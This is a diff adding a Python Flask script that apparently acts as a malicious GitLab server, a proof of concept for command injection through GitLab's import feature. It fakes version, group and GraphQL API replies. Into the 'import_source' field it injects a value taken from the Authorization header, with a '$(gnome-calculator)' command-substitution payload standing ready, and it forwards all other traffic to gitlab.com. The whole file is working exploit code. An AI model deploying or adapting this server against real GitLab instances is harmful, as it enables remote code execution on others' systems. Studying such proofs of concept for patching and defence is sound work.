@@ -1,0 +1,74 @@
+from flask import Flask, request, Response, send_file
+from flask import jsonify, make_response
+import requests
+
+app = Flask(__name__)
+CMD = "$(gnome-calculator)"
+HTTP_METHODS = ['GET', 'HEAD', 'POST', 'PUT',
+				'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']
+
+def do_proxy(request, path):
+	print("Use Proxy with path: "+path)
+	excluded_headers = ['content-encoding',
+						'content-length', 'transfer-encoding', 'connection', 'host']
+
+	headers = [(name, value) for (name, value) in request.headers
+			   if name.lower() not in excluded_headers]
+
+	host = request.headers["host"]
+	print(host)
+	if host.endswith(":8800"):
+		host = "gitlab.com"
+	print("Host after: " + host)
+	resp = requests.request(
+		url=f'https://{host}/{path}?{request.query_string.decode()}', method=request.method, headers=dict(headers), data=request.data)
+	print(f'https://{host}/{path}?{request.query_string.decode()}')
+	headers = [(name, value) for (name, value) in resp.raw.headers.items()
+			   if name.lower() not in excluded_headers]
+	response = Response(resp.content, resp.status_code, headers)
+	return response
+
+@app.route('/', defaults={'path': ''}, methods=HTTP_METHODS)
+@app.route('/<path:path>', methods=HTTP_METHODS)
+def proxy(path):
+	if request.method == "GET" and request.path == "/api/v4/version":
+		result = '{"version":"15.1.0-ee","revision":"31c24d2d864"}'
+		resp = make_response(result, 200)
+		resp.headers['Content-type'] = 'application/json; charset=utf-8'
+		return resp
+
+	if request.method == "GET" and request.path.startswith("/api/v4/groups"):
+		result = '[{"id":7,"web_url":"http://gitlab.com/groups/group1","name":"group1","path":"group1","description":"","visibility":"public","share_with_group_lock":false,"require_two_factor_authentication":false,"two_factor_grace_period":48,"project_creation_level":"developer","auto_devops_enabled":null,"subgroup_creation_level":"maintainer","emails_disabled":null,"mentions_disabled":null,"lfs_enabled":true,"default_branch_protection":2,"avatar_url":null,"request_access_enabled":true,"full_name":"group1","full_path":"group1","created_at":"2022-07-14T07:27:28.795Z","parent_id":null,"ldap_cn":null,"ldap_access":null},{"id":12,"web_url":"http://gitlab.com/groups/group11","name":"group1","path":"group11","description":"","visibility":"public","share_with_group_lock":false,"require_two_factor_authentication":false,"two_factor_grace_period":48,"project_creation_level":"developer","auto_devops_enabled":null,"subgroup_creation_level":"maintainer","emails_disabled":null,"mentions_disabled":null,"lfs_enabled":true,"default_branch_protection":2,"avatar_url":null,"request_access_enabled":true,"full_name":"group1","full_path":"group11","created_at":"2022-07-15T10:12:03.868Z","parent_id":null,"ldap_cn":null,"ldap_access":null}]'
+		resp = make_response(result, 200)
+		resp.headers['Content-type'] = 'application/json; charset=utf-8'
+		return resp
+
+	if request.method == "POST" and request.path.endswith("/export_relations"):
+		result = '{"error":"404 Not Found"}'
+		resp = make_response(result, 404)
+		resp.headers['Content-type'] = 'application/json; charset=utf-8'
+		return resp
+
+	if request.method == "POST" and request.path == "/api/graphql":
+		if "request_access_enabled: requestAccessEnabled" in request.json['query']:
+			cmd = request.headers['Authorization']
+			cmd = cmd.split("Bearer ")[1]
+			print("Command: " + cmd)
+			
+			result = '{"data":{"project":{"description":null,"visibility":"private","archived":false,"created_at":"2022-07-12T07:55:25Z","shared_runners_enabled":true,"container_registry_enabled":true,"only_allow_merge_if_pipeline_succeeds":false,"only_allow_merge_if_all_discussions_are_resolved":false,"request_access_enabled":true,"printing_merge_request_link_enabled":true,"remove_source_branch_after_merge":true,"autoclose_referenced_issues":true,"suggestion_commit_message":null,"wiki_enabled": true,"import_source": "%s", "template_name":"spring"}}}' % cmd
+			resp = make_response(result, 200)
+			resp.headers['Content-type'] = 'application/json; charset=utf-8'
+			return resp
+		if request.json['operationName'] == "IntrospectionQuery":
+			return send_file("misc_response.json")
+
+		if request.json['operationName'].startswith("GraphQL__Client__OperationDefinition"):
+			result = '{"data":{"metadata":{"version":"15.1.0-ee"}}}'
+			resp = make_response(result, 200)
+			resp.headers['Content-type'] = 'application/json; charset=utf-8'
+			return resp 
+
+	return do_proxy(request, path)
+
+app.run(host="127.0.0.1", port=8800,debug=False)
+	
